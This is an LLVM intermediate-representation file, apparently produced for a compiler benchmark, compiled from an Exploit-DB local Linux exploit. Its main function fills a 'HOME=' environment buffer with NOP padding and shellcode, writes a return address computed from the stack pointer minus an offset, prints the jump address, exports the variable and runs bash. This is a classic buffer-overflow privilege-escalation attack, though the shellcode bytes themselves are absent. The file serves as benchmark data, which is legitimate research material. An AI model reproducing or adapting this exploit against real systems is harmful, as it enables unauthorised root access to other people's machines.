; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21231.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21231.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@s = common dso_local global i64* null, align 8
@.str = private unnamed_addr constant [6 x i8] c"HOME=\00", align 1
@s1 = common dso_local global i64* null, align 8
@shellcode = common dso_local global i64* null, align 8
@NOP = common dso_local global i32 0, align 4
@OFS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [13 x i8] c"Jump to: %p\0A\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"bash\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = load i64*, i64** @s, align 8
  %3 = call i32 @strcpy(i64* %2, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %4 = load i64*, i64** @s, align 8
  %5 = getelementptr inbounds i64, i64* %4, i64 5
  store i64* %5, i64** @s1, align 8
  br label %6

6:                                                ; preds = %19, %0
  %7 = load i64*, i64** @s1, align 8
  %8 = load i64*, i64** @s, align 8
  %9 = getelementptr inbounds i64, i64* %8, i64 260
  %10 = getelementptr inbounds i64, i64* %9, i64 5
  %11 = load i64*, i64** @shellcode, align 8
  %12 = call i64* @strlen(i64* %11)
  %13 = ptrtoint i64* %10 to i64
  %14 = ptrtoint i64* %12 to i64
  %15 = sub i64 %13, %14
  %16 = sdiv exact i64 %15, 8
  %17 = inttoptr i64 %16 to i64*
  %18 = icmp ult i64* %7, %17
  br i1 %18, label %19, label %24

19:                                               ; preds = %6
  %20 = load i32, i32* @NOP, align 4
  %21 = sext i32 %20 to i64
  %22 = load i64*, i64** @s1, align 8
  %23 = getelementptr inbounds i64, i64* %22, i32 1
  store i64* %23, i64** @s1, align 8
  store i64 %21, i64* %22, align 8
  br label %6

24:                                               ; preds = %6
  br label %25

25:                                               ; preds = %29, %24
  %26 = load i64*, i64** @shellcode, align 8
  %27 = load i64, i64* %26, align 8
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %35

29:                                               ; preds = %25
  %30 = load i64*, i64** @shellcode, align 8
  %31 = getelementptr inbounds i64, i64* %30, i32 1
  store i64* %31, i64** @shellcode, align 8
  %32 = load i64, i64* %30, align 8
  %33 = load i64*, i64** @s1, align 8
  %34 = getelementptr inbounds i64, i64* %33, i32 1
  store i64* %34, i64** @s1, align 8
  store i64 %32, i64* %33, align 8
  br label %25

35:                                               ; preds = %25
  %36 = call i64 (...) @get_esp()
  %37 = load i64, i64* @OFS, align 8
  %38 = sub i64 %36, %37
  %39 = load i64*, i64** @s1, align 8
  store i64 %38, i64* %39, align 8
  %40 = load i64*, i64** @s1, align 8
  %41 = load i64, i64* %40, align 8
  %42 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i64 %41)
  %43 = load i64*, i64** @s1, align 8
  %44 = getelementptr inbounds i64, i64* %43, i64 4
  store i64* %44, i64** @s1, align 8
  %45 = load i64*, i64** @s1, align 8
  store i64 0, i64* %45, align 8
  %46 = load i64*, i64** @s, align 8
  %47 = call i32 @putenv(i64* %46)
  %48 = call i32 @system(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %49 = load i32, i32* %1, align 4
  ret i32 %49
}

declare dso_local i32 @strcpy(i64*, i8*) #1

declare dso_local i64* @strlen(i64*) #1

declare dso_local i64 @get_esp(...) #1

declare dso_local i32 @printf(i8*, i64) #1

declare dso_local i32 @putenv(i64*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
